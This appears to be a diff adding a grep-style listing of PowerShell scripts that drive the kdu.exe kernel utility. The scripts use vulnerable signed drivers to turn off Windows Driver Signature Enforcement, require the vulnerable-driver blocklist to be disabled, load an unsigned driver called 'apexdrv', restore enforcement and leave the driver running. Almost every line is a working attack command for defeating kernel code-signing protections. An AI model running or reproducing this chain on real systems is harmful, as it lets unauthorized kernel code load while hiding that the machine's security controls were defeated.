@@ -1,0 +1,48 @@
+﻿h1a_bl.ps1
+h1b2_dse_read.ps1
+h1b3_dse_set.ps1
+h1b_probe.ps1
+h1c_try.ps1
+h1z_hvoff.ps1
+h1_dse_host.ps1
+h1_host.txt
+h1a_bl.ps1: # h1a - set the kdu blocklist bypass live (guest-proven recipe) and prove kdu reads it as disabled.
+h1a_bl.ps1: & cmd.exe /c ('"C:\p37vm\payload\kdu.exe" -list > "' + $PSScriptRoot + '\_h1a_klist.txt" 2>&1')
+h1a_bl.ps1: W ('  kdu -list rc=' + $LASTEXITCODE)
+h1b2_dse_read.ps1: # h1b2 - read-only DSE state re-check (kdu -dse with no value). Loads prv 22, writes nothing.
+h1b2_dse_read.ps1: & cmd.exe /c ('"C:\p37vm\payload\kdu.exe" -prv 22 -dse > "' + $o + '" 2>&1')
+h1b3_dse_set.ps1: & cmd.exe /c ('"C:\p37vm\payload\kdu.exe" -prv 22 -dse 6 > "' + $o + '" 2>&1')
+h1b_probe.ps1: # h1b - which provider does kdu actually pick on this host, and why did the DSE write fault?
+h1b_probe.ps1: # Non-mutating except the final kdu -dse 6 (writes 6 over 6; may BSOD if the provider is VA-only).
+h1b_probe.ps1: foreach($s in 'DBUtilDrv2','gdrv3','apexdrv'){ W ($s + ' :: ' + (((& sc.exe query $s 2>&1) -join ' ') -replace '\s+',' ')) }
+h1b_probe.ps1: $kdu = $pay + '\kdu.exe'
+h1b_probe.ps1: & cmd.exe /c ('"' + $kdu + '" -prv 22 -diag > "' + $pay + '\_h1b_diag.txt" 2>&1')
+h1b_probe.ps1: W '## kdu -prv 22 -dse 6 (write 6 over 6, provider trace)'
+h1b_probe.ps1: & cmd.exe /c ('"' + $kdu + '" -prv 22 -dse 6 > "' + $cap + '" 2>&1')
+h1b_probe.ps1: foreach($s in 'DBUtilDrv2','apexdrv'){ W ($s + ' :: ' + (((& sc.exe query $s 2>&1) -join ' ') -replace '\s+',' ')) }
+h1c_try.ps1: # h1c - try one kdu provider for a DSE write and report the outcome from the capture.
+h1c_try.ps1: & cmd.exe /c ('"' + $pay + '\kdu.exe" -prv ' + $prv + ' -dse ' + $val + ' > "' + $cap + '" 2>&1')
+h1c_try.ps1: W ('  apexdrv: ' + (((& sc.exe query apexdrv 2>&1) -join ' ') -replace '\s+',' '))
+h1_dse_host.ps1: # h1 - HOST milestone 1a: open DSE with kdu, load apexdrv, restore DSE, LEAVE THE DRIVER RUNNING.
+h1_dse_host.ps1: #   baseline 577 -> kdu -prv 22 -dse 0 (verify) -> sc start apexdrv (rc 0, STATE 4 RUNNING)
+h1_dse_host.ps1: #   -> kdu -prv 22 -dse 6 (verify) -> driver left RUNNING for the G1 gate run (h2).
+h1_dse_host.ps1: # Pre-flight aborts unless: apexdrv staged+stopped at 577 with the k9-proven binary (hash 9B119FD0...),
+h1_dse_host.ps1: # Writes: _ritual\h1_host.txt   (self-elevates; kdu rc=1 on success too - gate on output strings only)
+h1_dse_host.ps1: $svc  = 'apexdrv'
+h1_dse_host.ps1: $bin  = "$env:WINDIR\System32\drivers\apexdrv.sys"
+h1_dse_host.ps1: function Svc([string]$argline, [int]$capMs = 6000) { return RunExe "$env:SystemRoot\system32\sc.exe" ($argline -split ' ') $capMs }
+h1_dse_host.ps1: function DrvRunning { (((& sc.exe query $svc 2>&1) -join ' ') -match 'STATE\s+:\s+4\s+RUNNING') }
+h1_dse_host.ps1: $qv = ((& sc.exe qc $svc 2>&1) -join ' ')
+h1_dse_host.ps1: $svcOk = ($qv -notmatch '1060') -and ($qv -match 'apexdrv\.sys')
+h1_dse_host.ps1: if(-not $svcOk){ $fail++; W '  FAIL: service apexdrv missing or binPath is not apexdrv.sys' } else { W '  pass: service apexdrv staged' }
+h1_dse_host.ps1: $qs = ((& sc.exe query $svc 2>&1) -join ' ')
+h1_dse_host.ps1: if($bl -eq 0){ W '  pass: VulnerableDriverBlocklistEnable = 0 (live)' } else { $fail++; W ('  FAIL: blocklist = ' + $bl + ' (kdu providers get 0xC0000603) - set it to 0 first') }
+h1_dse_host.ps1: foreach($f in 'kdu.exe','drv64.dll'){ if(-not (Test-Path -LiteralPath (Join-Path $pay $f))){ $fail++; W ('  FAIL: missing ' + $f) } }
+h1_dse_host.ps1: foreach($f in 'kdu.exe','drv64.dll'){ Unblock-File -LiteralPath (Join-Path $pay $f) -EA SilentlyContinue }
+h1_dse_host.ps1: W '## STEP ladder: kdu -prv <id> -dse 0 (gate on "verification succeeded")'
+h1_dse_host.ps1: $null = RunExe (Join-Path $pay 'kdu.exe') @('-prv', "$id", '-dse', '0') 20000
+h1_dse_host.ps1: W '## STEP load: sc start apexdrv inside the open window'
+h1_dse_host.ps1: W ('  start rc=' + $rcLoad + ' RUNNING=' + $loaded + ' :: ' + (((& sc.exe query $svc 2>&1) | Select-String 'STATE' | ForEach-Object { $_.ToString().Trim() }) -join ' '))
+h1_dse_host.ps1: W '## STEP restore: kdu -prv <winner> -dse 6'
+h1_dse_host.ps1: $null = RunExe (Join-Path $pay 'kdu.exe') @('-prv', "$winner", '-dse', '6') 20000
+h1_dse_host.ps1: $null = RunExe (Join-Path $pay 'kdu.exe') @('-prv', "$winner", '-dse', '6') 20000
